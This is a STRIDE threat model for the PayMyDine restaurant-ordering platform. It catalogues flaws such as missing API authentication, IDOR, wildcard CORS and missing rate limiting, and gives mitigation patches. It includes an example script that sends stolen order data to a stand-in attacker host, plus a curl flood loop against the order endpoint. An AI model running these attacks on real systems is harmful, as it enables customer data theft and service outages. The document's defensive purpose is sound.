# PayMyDine Security Threat Model

**Last Updated:** 2025-10-09  
**Version:** 1.0  
**Methodology:** STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)

---

## Executive Summary

**Overall Risk Rating:** 🔴 **CRITICAL**

PayMyDine has **23 critical security vulnerabilities** across multiple attack vectors. The most severe issues are:
1. No authentication on public API (IDOR, data tampering)
2. Race conditions in order processing
3. Cross-tenant data leakage risks
4. Missing payment webhook verification
5. Insecure tenant credential storage

**Immediate Actions Required:**
- Add authentication to all API endpoints
- Fix order ID race condition (use UUID)
- Enable CSRF protection
- Restrict CORS to frontend domains
- Add rate limiting (prevent DDoS)
- Verify Stripe webhook signatures
- Encrypt tenant database credentials

---

## STRIDE Threat Analysis

### 1. Spoofing (Identity Forgery)

| ID | Threat | Severity | Evidence | Impact | Mitigation Status |
|----|--------|----------|----------|--------|-------------------|
| **S-01** | **No API Authentication** | 🔴 CRITICAL | `routes/api.php:122-408` - No auth middleware | Anyone can impersonate customers, place orders, view PII | ❌ Not implemented |
| **S-02** | **Weak Superadmin Auth** | 🔴 CRITICAL | `routes.php:241-242` - No rate limit on login | Brute force attacks possible | ⚠️ Partial (auth exists, no rate limit) |
| **S-03** | **Tenant Spoofing via Headers** | 🟠 HIGH | `DetectTenant.php:22-25` - Trusts `X-Tenant-Subdomain` header | Client can fake tenant identity | ❌ Not mitigated |
| **S-04** | **Missing JWT/API Token** | 🔴 CRITICAL | No token system found | Cannot verify customer identity across requests | ❌ Not implemented |
| **S-05** | **No CAPTCHA on Forms** | 🟡 MEDIUM | Order, waiter call endpoints | Bots can spam orders/notifications | ❌ Not implemented |

---

#### S-01: No API Authentication (CRITICAL)

**Threat Description:**
- All public API endpoints (`/api/v1/*`) have **zero authentication**
- Anyone can create orders, view orders, update order status, access customer PII
- No way to verify customer identity or ownership of orders

**Attack Scenario:**
```
1. Attacker calls GET /api/v1/orders?date=2025-10-09
2. Receives list of ALL orders with customer names, emails, phones
3. Calls GET /api/v1/orders/{orderId} for each order
4. Downloads complete order history with PII
5. Calls PATCH /api/v1/orders/{orderId} to cancel orders
```

**Evidence:**
- `routes/api.php:122-408` - No `auth` middleware
- `app/Http/Controllers/Api/OrderController.php:16-437` - No authentication checks

**Mitigation:**

```php
// routes/api.php
Route::prefix('v1')->middleware(['cors', 'detect.tenant', 'throttle:60,1'])->group(function () {
    
    // Public (read-only, no PII)
    Route::get('/menu', [MenuController::class, 'index']);
    Route::get('/tables', [TableController::class, 'index']);
    
    // Requires guest token (via CAPTCHA)
    Route::middleware(['guest.token'])->group(function () {
        Route::post('/orders', [OrderController::class, 'store']);
        Route::post('/waiter-call', [NotificationController::class, 'waiterCall']);
    });
    
    // Requires order token (returned after order creation)
    Route::middleware(['order.token'])->group(function () {
        Route::get('/orders/{orderId}', [OrderController::class, 'show']);
        Route::get('/order-status', [OrderController::class, 'getOrderStatus']);
    });
    
    // Requires admin authentication
    Route::middleware(['auth:sanctum', 'role:admin,manager'])->group(function () {
        Route::get('/orders', [OrderController::class, 'index']);
        Route::patch('/orders/{orderId}', [OrderController::class, 'update']);
    });
});
```

**Implementation Steps:**

1. **Install Laravel Sanctum:**
```bash
composer require laravel/sanctum
php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
php artisan migrate
```

2. **Create Order Token Middleware:**
```php
// app/Http/Middleware/OrderToken.php
class OrderToken {
    public function handle(Request $request, Closure $next) {
        $orderId = $request->route('orderId') ?? $request->get('order_id');
        $token = $request->get('token') ?? $request->bearerToken();
        
        $order = DB::table('orders')
            ->where('order_id', $orderId)
            ->where('order_token', $token)
            ->first();
        
        if (!$order) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        
        $request->attributes->set('order', $order);
        return $next($request);
    }
}
```

3. **Update OrderController to Generate Tokens:**
```php
// In OrderController::store()
$orderToken = Str::random(32);

DB::table('orders')->insert([
    'order_id' => $orderId,
    'order_token' => $orderToken,
    // ... other fields
]);

return response()->json([
    'success' => true,
    'order_id' => $orderId,
    'token' => $orderToken, // Return token to client
]);
```

---

#### S-02: Weak Superadmin Auth (CRITICAL)

**Threat Description:**
- Superadmin login has no rate limiting or CAPTCHA
- Vulnerable to brute force attacks
- No account lockout after failed attempts

**Attack Scenario:**
```
1. Attacker discovers /superadmin/login endpoint
2. Runs brute force attack (1000s of attempts)
3. Eventually guesses password
4. Gains access to all tenant data
```

**Evidence:**
- `routes.php:241-242` - No `throttle` middleware
- No CAPTCHA implementation found

**Mitigation:**

```php
// routes.php
Route::post('/superadmin/sign', [SuperAdminController::class, 'sign'])
    ->middleware('throttle:5,1'); // 5 attempts per minute

// In SuperAdminController::sign()
public function sign(Request $request) {
    $key = 'login:' . $request->ip();
    
    if (RateLimiter::tooManyAttempts($key, 5)) {
        $seconds = RateLimiter::availableIn($key);
        return back()->withErrors([
            'Too many login attempts. Try again in ' . ceil($seconds / 60) . ' minutes.'
        ]);
    }
    
    // Verify CAPTCHA
    if (!$this->verifyCaptcha($request->input('g-recaptcha-response'))) {
        return back()->withErrors(['CAPTCHA verification failed']);
    }
    
    // Authenticate user
    if (!Auth::attempt($request->only('email', 'password'))) {
        RateLimiter::hit($key, 300); // 5-minute penalty
        return back()->withErrors(['Invalid credentials']);
    }
    
    RateLimiter::clear($key);
    return redirect('/superadmin/index');
}
```

---

### 2. Tampering (Data Modification)

| ID | Threat | Severity | Evidence | Impact | Mitigation Status |
|----|--------|----------|----------|--------|-------------------|
| **T-01** | **IDOR: Update Any Order** | 🔴 CRITICAL | `OrderController.php:243-278` | Unauthorized status changes | ❌ No authorization |
| **T-02** | **Race Condition in Order ID** | 🔴 CRITICAL | `OrderController.php:333` | Duplicate/overwrite orders | ❌ Uses MAX+1 pattern |
| **T-03** | **SQL Injection Risk** | 🟠 HIGH | Multiple controllers use raw SQL | Data corruption, privilege escalation | ⚠️ Partial (Laravel escapes by default) |
| **T-04** | **CSRF Not Enabled** | 🟠 HIGH | No CSRF middleware in API routes | State-changing requests vulnerable | ❌ Not enabled |
| **T-05** | **Client-Side Amount Validation** | 🔴 CRITICAL | `create-intent/route.ts:23-30` | Client controls payment amount | ❌ Trusts client input |
| **T-06** | **No FK Constraints** | 🟡 MEDIUM | Database schema | Orphaned records, data inconsistency | ❌ No FKs enforced |

---

#### T-01: IDOR - Update Any Order (CRITICAL)

**Threat Description:**
- Anyone can call `PATCH /api/v1/orders/{orderId}` to change order status
- No verification that caller owns the order
- Can mark orders as delivered, cancelled, etc. without authorization

**Attack Scenario:**
```
1. Attacker places order (order_id=123)
2. Calls PATCH /api/v1/orders/124 (someone else's order)
3. Changes status to "cancelled"
4. Victim's order is cancelled without their knowledge
```

**Evidence:**
- `app/Http/Controllers/Api/OrderController.php:243-278`
- No auth middleware on route

**Mitigation:**
- Use order token authentication (see S-01)
- Add state machine to prevent invalid transitions
- Log all status changes for audit trail

**Patch:**
```diff
--- a/app/Http/Controllers/Api/OrderController.php
+++ b/app/Http/Controllers/Api/OrderController.php
@@ -242,6 +242,20 @@ class OrderController extends Controller
      */
     public function update(Request $request, $orderId)
     {
+        // Verify order ownership via token
+        $orderToken = $request->get('token') ?? $request->bearerToken();
+        
+        $order = DB::table('orders')
+            ->where('order_id', $orderId)
+            ->first();
+        
+        if (!$order) {
+            return response()->json(['error' => 'Order not found'], 404);
+        }
+        
+        // Only allow staff to update orders (not customers)
+        if (!Auth::user() || !Auth::user()->hasRole(['admin', 'waiter'])) {
+            return response()->json(['error' => 'Unauthorized'], 403);
+        }
+        
         $validator = Validator::make($request->all(), [
             'status_id' => 'required|integer|exists:statuses,status_id'
         ]);
@@ -252,6 +266,31 @@ class OrderController extends Controller
             ], 422);
         }
 
+        // Validate state machine transitions
+        $allowedTransitions = [
+            1 => [2, 6], // pending → confirmed, cancelled
+            2 => [3, 6], // confirmed → preparing, cancelled
+            3 => [4],    // preparing → ready
+            4 => [5],    // ready → delivered
+            5 => [],     // delivered (final state)
+            6 => [],     // cancelled (final state)
+        ];
+        
+        $currentStatus = $order->status_id;
+        $newStatus = $request->status_id;
+        
+        if (!in_array($newStatus, $allowedTransitions[$currentStatus] ?? [])) {
+            return response()->json([
+                'error' => 'Invalid status transition',
+                'current_status' => $currentStatus,
+                'attempted_status' => $newStatus
+            ], 400);
+        }
+        
+        // Log status change
+        Log::info('Order status changed', [
+            'order_id' => $orderId,
+            'old_status' => $currentStatus,
+            'new_status' => $newStatus,
+            'user_id' => Auth::id(),
+            'ip' => $request->ip()
+        ]);
+        
         try {
             $updated = DB::table('orders')
                 ->where('order_id', $orderId)
```

---

#### T-02: Race Condition in Order ID (CRITICAL)

**Threat Description:**
- Order ID generation uses `max('order_id') + 1` pattern
- Under concurrent requests, multiple orders can get same ID
- Leads to data overwrites, lost orders

**Attack Scenario:**
```
Time    Request A                   Request B
0ms     GET max(order_id) = 100     GET max(order_id) = 100
1ms     Calculate ID = 101          Calculate ID = 101
2ms     INSERT order_id=101         INSERT order_id=101
3ms     ❌ Duplicate key error OR one overwrites other
```

**Evidence:**
- `app/Http/Controllers/Api/OrderController.php:330-335`

```php
private function generateOrderNumber()
{
    $prefix = config('app.order_prefix', '#');
    $number = DB::table('orders')->max('order_id') + 1;
    return $prefix . str_pad($number, 6, '0', STR_PAD_LEFT);
}
```

**Mitigation:**

```diff
--- a/app/Http/Controllers/Api/OrderController.php
+++ b/app/Http/Controllers/Api/OrderController.php
@@ -44,7 +44,7 @@ class OrderController extends Controller
             DB::beginTransaction();
 
             // Generate order number
-            $orderNumber = $this->generateOrderNumber();
+            $orderNumber = (string) Str::uuid();
 
             // Create main order record
             $orderId = DB::table('orders')->insertGetId([
@@ -329,9 +329,10 @@ class OrderController extends Controller
      */
     private function generateOrderNumber()
     {
-        $prefix = config('app.order_prefix', '#');
-        $number = DB::table('orders')->max('order_id') + 1;
-        return $prefix . str_pad($number, 6, '0', STR_PAD_LEFT);
+        // Use timestamp + random to ensure uniqueness
+        $timestamp = now()->format('ymdHis'); // 20251009120000
+        $random = mt_rand(1000, 9999);
+        return config('app.order_prefix', '#') . $timestamp . $random;
     }
 }
```

**Alternative (Use Database AUTO_INCREMENT):**
```sql
ALTER TABLE ti_orders AUTO_INCREMENT = 1000;
-- Then use DB::getPdo()->lastInsertId() instead of generateOrderNumber()
```

---

#### T-05: Client-Side Amount Validation (CRITICAL)

**Threat Description:**
- Payment amount is sent from client without server-side verification
- Attacker can modify amount to pay $0.01 for $100 order

**Attack Scenario:**
```
1. Customer adds $100 worth of items to cart
2. Intercepts POST /api/payments/create-intent request
3. Changes amount: 10000 → 1 (cents)
4. Stripe charges $0.01 instead of $100
5. Order is marked as paid
```

**Evidence:**
- `frontend/app/api/payments/create-intent/route.ts:22-36`

```typescript
const { amount, currency, items } = body;
// No validation that amount matches items!

const paymentIntent = await stripe.paymentIntents.create({
    amount: Math.round(amount * 100), // Trusts client input
    // ...
});
```

**Mitigation:**

```diff
--- a/frontend/app/api/payments/create-intent/route.ts
+++ b/frontend/app/api/payments/create-intent/route.ts
@@ -29,6 +29,18 @@ export async function POST(request: NextRequest) {
         tableNumber,
     } = body
 
+    // CRITICAL: Calculate amount server-side
+    const serverAmount = await calculateOrderTotal(items, restaurantId, tableNumber);
+    
+    // Verify client amount matches server calculation
+    if (Math.abs(serverAmount - amount) > 0.01) {
+        console.error('Amount mismatch:', {
+            client: amount,
+            server: serverAmount,
+            diff: Math.abs(serverAmount - amount)
+        });
+        return NextResponse.json({ error: 'Amount mismatch' }, { status: 400 });
+    }
+    
     // Validate required fields
     if (!amount || !currency || !restaurantId) {
         return NextResponse.json({
@@ -50,7 +62,10 @@ export async function POST(request: NextRequest) {
 
     // Create payment intent with marketplace configuration
     const paymentIntent = await stripe.paymentIntents.create({
-        amount: Math.round(amount * 100), // Convert to cents
+        amount: Math.round(serverAmount * 100), // Use server-calculated amount
         currency: currency.toLowerCase(),
+        // Add idempotency key to prevent duplicate charges
+        idempotency_key: request.headers.get('Idempotency-Key') || `${Date.now()}-${Math.random()}`,
         automatic_payment_methods: {
             enabled: true,
         },
@@ -82,6 +97,26 @@ export async function POST(request: NextRequest) {
     }
 }

+/**
+ * Calculate order total server-side (MUST match client calculation)
+ */
+async function calculateOrderTotal(items: any[], restaurantId: string, tableNumber?: number): Promise<number> {
+    let total = 0;
+    
+    for (const item of items) {
+        // Fetch actual price from database (don't trust client)
+        const menuItem = await fetch(`${process.env.API_URL}/api/v1/menus/${item.id}`);
+        const { price } = await menuItem.json();
+        
+        total += price * item.quantity;
+    }
+    
+    // Add tax, fees, etc.
+    const tax = total * 0.08; // 8% tax
+    const platformFee = total * 0.03; // 3% platform fee
+    
+    return total + tax + platformFee;
+}
+
 async function getRestaurantStripeAccount(restaurantId: string) {
     // This would typically fetch from your database
```

---

### 3. Repudiation (Deny Actions)

| ID | Threat | Severity | Evidence | Impact | Mitigation Status |
|----|--------|----------|----------|--------|-------------------|
| **R-01** | **No Audit Logs** | 🟠 HIGH | No logging of admin actions | Cannot prove who changed orders, deleted data | ❌ Not implemented |
| **R-02** | **No Payment Audit Trail** | 🟠 HIGH | Stripe webhooks not logged | Cannot prove payment was received | ⚠️ Partial (Stripe logs exist) |
| **R-03** | **No Request Signing** | 🟡 MEDIUM | No HMAC or signature on requests | Client can deny placing order | ❌ Not implemented |

---

#### R-01: No Audit Logs (HIGH)

**Threat Description:**
- No logging of admin actions (order updates, menu changes, etc.)
- Cannot determine who deleted tenant, changed prices, etc.
- Compliance issues (GDPR, PCI DSS require audit trails)

**Mitigation:**

```php
// Create audit log table
Schema::create('audit_logs', function (Blueprint $table) {
    $table->id();
    $table->unsignedBigInteger('user_id')->nullable();
    $table->string('action'); // create, update, delete, view
    $table->string('model'); // Order, Menu, Tenant, etc.
    $table->unsignedBigInteger('model_id')->nullable();
    $table->json('old_values')->nullable();
    $table->json('new_values')->nullable();
    $table->string('ip_address');
    $table->string('user_agent');
    $table->timestamps();
    
    $table->index(['model', 'model_id']);
    $table->index('created_at');
});

// Add audit logging trait
trait Auditable {
    public static function bootAuditable() {
        static::created(function ($model) {
            AuditLog::create([
                'user_id' => Auth::id(),
                'action' => 'create',
                'model' => get_class($model),
                'model_id' => $model->id,
                'new_values' => $model->toArray(),
                'ip_address' => request()->ip(),
                'user_agent' => request()->userAgent(),
            ]);
        });
        
        static::updated(function ($model) {
            AuditLog::create([
                'user_id' => Auth::id(),
                'action' => 'update',
                'model' => get_class($model),
                'model_id' => $model->id,
                'old_values' => $model->getOriginal(),
                'new_values' => $model->getChanges(),
                'ip_address' => request()->ip(),
                'user_agent' => request()->userAgent(),
            ]);
        });
    }
}
```

---

### 4. Information Disclosure (Data Leakage)

| ID | Threat | Severity | Evidence | Impact | Mitigation Status |
|----|--------|----------|----------|--------|-------------------|
| **I-01** | **IDOR: View Any Order PII** | 🔴 CRITICAL | `OrderController.php:169-238` | Expose all customer emails, phones, names | ❌ No authorization |
| **I-02** | **Mass PII Export** | 🔴 CRITICAL | `GET /api/v1/orders` no auth | Download all customer data | ❌ Public endpoint |
| **I-03** | **Tenant DB Credentials in Main DB** | 🔴 CRITICAL | `ti_tenants.db_pass` plaintext | Cross-tenant access possible | ❌ Not encrypted |
| **I-04** | **Debug Endpoint in Production** | 🟡 MEDIUM | `/api/v1/debug/conn` | Database names exposed | ⚠️ Gated by debug flag |
| **I-05** | **Verbose Error Messages** | 🟡 MEDIUM | `$e->getMessage()` returned | Stack traces leak file paths | ❌ Not sanitized |
| **I-06** | **CORS Allows All Origins** | 🟠 HIGH | `CorsMiddleware.php:22` | Any site can read API responses | ❌ Wildcard allowed |

---

#### I-03: Tenant DB Credentials in Plaintext (CRITICAL)

**Threat Description:**
- Tenant database credentials stored in main DB without encryption
- If main DB is compromised, attacker gains access to ALL tenant databases
- Tenant can specify malicious DB host to read other tenants' data

**Attack Scenario:**
```
1. Attacker compromises main database (SQL injection, stolen credentials, etc.)
2. Queries SELECT * FROM ti_tenants
3. Retrieves plaintext passwords for all tenant databases
4. Connects to each tenant DB and downloads all data
```

**Evidence:**
- `app/Http/Middleware/DetectTenant.php:38-41`

```php
Config::set('database.connections.tenant.password', $tenant->db_pass ?? env('TENANT_DB_PASSWORD'));
// $tenant->db_pass is plaintext from database!
```

**Mitigation:**

```php
// 1. Encrypt tenant credentials
Schema::table('tenants', function (Blueprint $table) {
    $table->text('db_pass_encrypted')->nullable();
});

// Migrate existing passwords
DB::table('tenants')->chunkById(100, function ($tenants) {
    foreach ($tenants as $tenant) {
        DB::table('tenants')
            ->where('id', $tenant->id)
            ->update([
                'db_pass_encrypted' => encrypt($tenant->db_pass)
            ]);
    }
});

// 2. Update middleware to decrypt
Config::set('database.connections.tenant.password', decrypt($tenant->db_pass_encrypted));

// 3. Better: Use IAM authentication (no passwords)
// For AWS RDS:
$token = Aws\Rds\AuthTokenGenerator::fromCredentials($credentials)
    ->createToken($tenant->db_host . ':3306', 'region', $tenant->db_user);
Config::set('database.connections.tenant.password', $token);
```

**Even Better: Don't Allow Custom DB Credentials**

```php
// SuperAdminController::store() - Create tenant
public function store(Request $request) {
    $request->validate([
        'name' => 'required|string|max:255',
        'domain' => 'required|string|regex:/^[a-z0-9-]+$/|unique:tenants,domain',
    ]);
    
    // Generate secure credentials (don't accept from user)
    $dbName = 'tenant_' . Str::random(16);
    $dbUser = 'user_' . Str::random(16);
    $dbPass = Str::random(32);
    
    // Create database via privileged connection
    DB::connection('root')->statement("CREATE DATABASE `{$dbName}`");
    DB::connection('root')->statement("CREATE USER '{$dbUser}'@'%' IDENTIFIED BY '{$dbPass}'");
    DB::connection('root')->statement("GRANT ALL ON `{$dbName}`.* TO '{$dbUser}'@'%'");
    DB::connection('root')->statement("FLUSH PRIVILEGES");
    
    // Store encrypted credentials
    DB::connection('mysql')->table('tenants')->insert([
        'domain' => $request->domain . '.paymydine.com',
        'database' => $dbName,
        'db_host' => env('DB_HOST'), // Same host for all tenants
        'db_user' => $dbUser,
        'db_pass_encrypted' => encrypt($dbPass),
        'status' => 'active',
    ]);
}
```

---

#### I-06: CORS Allows All Origins (HIGH)

**Threat Description:**
- CORS middleware allows requests from any origin (`*`)
- Malicious site can call API and read responses (if user is logged in)
- Enables CSRF-like attacks

**Attack Scenario:**
```html
<!-- evil.com -->
<script>
fetch('https://rosana.paymydine.com/api/v1/orders', {
    credentials: 'include' // Include cookies
}).then(r => r.json()).then(orders => {
    // Send customer PII to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(orders)
    });
});
</script>
```

**Evidence:**
- `app/Http/Middleware/CorsMiddleware.php:22`

```php
$response->headers->set('Access-Control-Allow-Origin', '*');
```

**Mitigation:**

```diff
--- a/app/Http/Middleware/CorsMiddleware.php
+++ b/app/Http/Middleware/CorsMiddleware.php
@@ -17,15 +17,31 @@ class CorsMiddleware
     public function handle(Request $request, Closure $next)
     {
+        // Whitelist of allowed origins
+        $allowedOrigins = [
+            'https://paymydine.com',
+            'https://www.paymydine.com',
+            env('FRONTEND_URL'), // e.g., http://localhost:3000 for dev
+        ];
+        
+        // Add tenant subdomains dynamically
+        $origin = $request->header('Origin');
+        $host = parse_url($origin, PHP_URL_HOST);
+        
+        // Allow *.paymydine.com
+        if (preg_match('/^[\w-]+\.paymydine\.com$/', $host)) {
+            $allowedOrigins[] = $origin;
+        }
+        
         $response = $next($request);
 
-        // Allow all origins for development
-        $response->headers->set('Access-Control-Allow-Origin', '*');
+        // Only allow whitelisted origins
+        if (in_array($origin, $allowedOrigins)) {
+            $response->headers->set('Access-Control-Allow-Origin', $origin);
+            $response->headers->set('Access-Control-Allow-Credentials', 'true');
+        }
         
         // Allow common HTTP methods
         $response->headers->set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
         
-        // Allow common headers
         $response->headers->set('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
-        
-        // Allow credentials
-        $response->headers->set('Access-Control-Allow-Credentials', 'true');
```

---

### 5. Denial of Service (Availability)

| ID | Threat | Severity | Evidence | Impact | Mitigation Status |
|----|--------|----------|----------|--------|-------------------|
| **D-01** | **No Rate Limiting** | 🔴 CRITICAL | No throttle middleware | DDoS attack possible | ❌ Not implemented |
| **D-02** | **No Pagination** | 🟠 HIGH | Menu, orders unbounded | Memory exhaustion | ⚠️ Partial (orders paginated) |
| **D-03** | **N+1 Queries** | 🟡 MEDIUM | Menu options fetched in loop | Slow responses, DB overload | ❌ Not optimized |
| **D-04** | **No Queue for Notifications** | 🟡 MEDIUM | Notifications block order response | Order creation slow | ❌ Synchronous |
| **D-05** | **Missing Indexes** | 🟠 HIGH | No indexes on FK columns | Slow queries, DB lock | ❌ Not added |

---

#### D-01: No Rate Limiting (CRITICAL)

**Threat Description:**
- No rate limiting on any API endpoint
- Attacker can send 1000s of requests per second
- Leads to service outage, increased costs

**Attack Scenario:**
```bash
# DDoS attack
while true; do
    for i in {1..1000}; do
        curl -X POST https://rosana.paymydine.com/api/v1/orders \
            -H "Content-Type: application/json" \
            -d '{"customer_name":"Bot","items":[...],"total_amount":100}' &
    done
    wait
done
```

**Evidence:**
- `routes/api.php:122-408` - No `throttle` middleware
- `app/Http/Kernel.php:25` - Throttle middleware exists but not used

**Mitigation:**

```php
// routes/api.php
Route::prefix('v1')
    ->middleware(['cors', 'detect.tenant', 'throttle:60,1']) // 60 requests per minute
    ->group(function () {
        
        // Stricter limits for write operations
        Route::post('/orders', [OrderController::class, 'store'])
            ->middleware('throttle:5,1'); // 5 orders per minute
        
        Route::post('/waiter-call', [NotificationController::class, 'waiterCall'])
            ->middleware('throttle:10,1'); // 10 calls per minute
    });

// For distributed systems (multiple servers), use Redis
// config/cache.php
'stores' => [
    'redis' => [
        'driver' => 'redis',
        'connection' => 'default',
    ],
],

// Update throttle middleware to use Redis
Route::middleware(['throttle:60,1,redis'])->group(function () {
    // ...
});
```

**Advanced: Rate Limiting by User/Tenant**

```php
// Custom rate limiter
use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Support\Facades\RateLimiter;

RateLimiter::for('orders', function (Request $request) {
    $tenant = $request->attributes->get('tenant');
    $tenantId = $tenant ? $tenant->id : 'guest';
    
    return Limit::perMinute(10)->by($tenantId);
});

// In routes
Route::post('/orders', [OrderController::class, 'store'])
    ->middleware('throttle:orders');
```

---

### 6. Elevation of Privilege (Unauthorized Access)

| ID | Threat | Severity | Evidence | Impact | Mitigation Status |
|----|--------|----------|----------|--------|-------------------|
| **E-01** | **Admin Endpoints Without Auth** | 🔴 CRITICAL | `routes.php:117-355` | Unauthorized access to admin functions | ⚠️ Some protected, some not |
| **E-02** | **Superadmin Routes Bypass Tenant Middleware** | 🔴 CRITICAL | `routes.php:225-260` | Cross-tenant data access | ⚠️ Has auth, but risky |
| **E-03** | **No Role-Based Access Control** | 🟠 HIGH | No roles found in code | Waiter can act as manager | ❌ Not implemented |
| **E-04** | **Tenant Can Specify DB Host** | 🔴 CRITICAL | Tenant creation accepts raw credentials | Read other tenants' data | ❌ Allowed |

---

#### E-01: Admin Endpoints Without Auth (CRITICAL)

**Threat Description:**
- Some admin endpoints missing authentication middleware
- Anyone can call these endpoints and access admin functions

**Evidence:**
- `routes.php:117-155` - `/admin/orders/get-table-statuses` has no auth middleware
- `routes.php:158-178` - `/admin/orders/get-cashier-url` has no auth middleware
- `routes.php:265-291` - `/admin/orders/save-table-layout` has no auth middleware

**Attack Scenario:**
```
1. Attacker discovers /admin/orders/get-table-statuses endpoint
2. Calls it without authentication
3. Receives status of all tables and orders
4. Gains operational intelligence (busy times, order volumes)
```

**Mitigation:**

```diff
--- a/routes.php
+++ b/routes.php
@@ -114,6 +114,7 @@ App::before(function () {
         Route::any(config('system.assetsCombinerUri', '_assets').'/{asset}', 'System\Classes\Controller@combineAssets');
 
         // Get table statuses for the order create page
+        Route::middleware(['AdminAuthenticate'])->group(function () {
         Route::get('/orders/get-table-statuses', function () {
             try {
                 $tableStatuses = DB::table('orders')
@@ -153,6 +154,7 @@ App::before(function () {
                 ]);
             }
         });
+        }); // End AdminAuthenticate group
 
         // Get cashier URL for frontend cashier mode
+        Route::middleware(['AdminAuthenticate'])->group(function () {
         Route::get('/orders/get-cashier-url', function (Request $request) {
```

---

## Top 10 Critical Risks (Summary)

| Rank | Risk | Severity | STRIDE Category | Fix Priority |
|------|------|----------|-----------------|--------------|
| 1 | No API Authentication | 🔴 CRITICAL | Spoofing, Information Disclosure | 🚨 IMMEDIATE |
| 2 | Order ID Race Condition | 🔴 CRITICAL | Tampering | 🚨 IMMEDIATE |
| 3 | IDOR: Update Any Order | 🔴 CRITICAL | Tampering, Elevation of Privilege | 🚨 IMMEDIATE |
| 4 | IDOR: View Any Order PII | 🔴 CRITICAL | Information Disclosure | 🚨 IMMEDIATE |
| 5 | Tenant DB Credentials Plaintext | 🔴 CRITICAL | Information Disclosure | 🚨 IMMEDIATE |
| 6 | Client-Side Amount Validation | 🔴 CRITICAL | Tampering | 🚨 IMMEDIATE |
| 7 | No Rate Limiting | 🔴 CRITICAL | Denial of Service | 🚨 IMMEDIATE |
| 8 | No Webhook Signature Verification | 🔴 CRITICAL | Tampering | 🚨 IMMEDIATE |
| 9 | Admin Endpoints Without Auth | 🔴 CRITICAL | Elevation of Privilege | 🚨 IMMEDIATE |
| 10 | CORS Allows All Origins | 🟠 HIGH | Information Disclosure | ⏰ URGENT |

---

## Security Headers & Cookies

### Current State

**Evidence:** No security headers middleware found

**Missing Headers:**
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy` (CSP)
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

**Cookie Issues:**
- No `Secure` flag (allows HTTP)
- No `HttpOnly` flag (vulnerable to XSS)
- No `SameSite=Strict` (CSRF risk)

---

### Mitigation Patch

**File:** `app/Http/Middleware/SecurityHeaders.php`

```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next)
    {
        $response = $next($request);
        
        // HSTS: Force HTTPS for 1 year
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
        
        // CSP: Restrict resource loading
        $response->headers->set('Content-Security-Policy', 
            "default-src 'self'; " .
            "script-src 'self' 'unsafe-inline' https://js.stripe.com https://www.google.com/recaptcha/; " .
            "style-src 'self' 'unsafe-inline'; " .
            "img-src 'self' data: https:; " .
            "font-src 'self' data:; " .
            "connect-src 'self' https://api.stripe.com; " .
            "frame-src 'self' https://js.stripe.com https://www.google.com/recaptcha/; " .
            "frame-ancestors 'none';"
        );
        
        // Prevent clickjacking
        $response->headers->set('X-Frame-Options', 'DENY');
        
        // Prevent MIME sniffing
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        
        // Referrer policy
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        
        // Permissions policy (disable unused features)
        $response->headers->set('Permissions-Policy', 
            'geolocation=(), microphone=(), camera=(), payment=(self)'
        );
        
        // Remove X-Powered-By header (information disclosure)
        $response->headers->remove('X-Powered-By');
        
        return $response;
    }
}
```

**Register middleware:**

```diff
--- a/app/Http/Kernel.php
+++ b/app/Http/Kernel.php
@@ -14,6 +14,7 @@ class Kernel extends HttpKernel
      */
     protected $routeMiddleware = [
+        'security.headers' => \App\Http\Middleware\SecurityHeaders::class,
         'auth' => \App\Http\Middleware\Authenticate::class,
         'auth.basic' => \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,

// Apply to all routes
--- a/routes/api.php
+++ b/routes/api.php
@@ -21,7 +21,7 @@ use App\Http\Controllers\Api\CategoryController;
 
 // Apply CORS middleware to all API routes
-Route::middleware(['cors'])->group(function () {
+Route::middleware(['cors', 'security.headers'])->group(function () {
```

**Cookie Configuration:**

```php
// config/session.php
return [
    'secure' => env('SESSION_SECURE_COOKIE', true), // Require HTTPS
    'http_only' => true, // Prevent JavaScript access
    'same_site' => 'strict', // CSRF protection
    'cookie' => env('SESSION_COOKIE', 'paymydine_session'),
    'domain' => env('SESSION_DOMAIN', null),
];
```

---

## Stripe Webhook Security

**Current State:** ❌ No webhook handler found, no signature verification

**Risk:** Attacker can forge webhook events (e.g., fake `payment_intent.succeeded`)

---

### Mitigation

**File:** `app/Http/Controllers/Api/StripeWebhookController.php`

```php
<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Stripe\Webhook;
use Stripe\Exception\SignatureVerificationException;

class StripeWebhookController extends Controller
{
    public function handle(Request $request)
    {
        $payload = $request->getContent();
        $sigHeader = $request->header('Stripe-Signature');
        $webhookSecret = env('STRIPE_WEBHOOK_SECRET');
        
        try {
            // Verify webhook signature
            $event = Webhook::constructEvent($payload, $sigHeader, $webhookSecret);
        } catch (SignatureVerificationException $e) {
            \Log::warning('Invalid Stripe webhook signature', [
                'ip' => $request->ip(),
                'headers' => $request->headers->all()
            ]);
            return response()->json(['error' => 'Invalid signature'], 400);
        }
        
        // Handle event
        switch ($event->type) {
            case 'payment_intent.succeeded':
                $paymentIntent = $event->data->object;
                $this->handlePaymentSuccess($paymentIntent);
                break;
            
            case 'payment_intent.payment_failed':
                $paymentIntent = $event->data->object;
                $this->handlePaymentFailed($paymentIntent);
                break;
            
            case 'charge.refunded':
                $charge = $event->data->object;
                $this->handleRefund($charge);
                break;
            
            default:
                \Log::info('Unhandled Stripe event', ['type' => $event->type]);
        }
        
        return response()->json(['status' => 'success']);
    }
    
    private function handlePaymentSuccess($paymentIntent)
    {
        $orderId = $paymentIntent->metadata->order_id ?? null;
        
        if (!$orderId) {
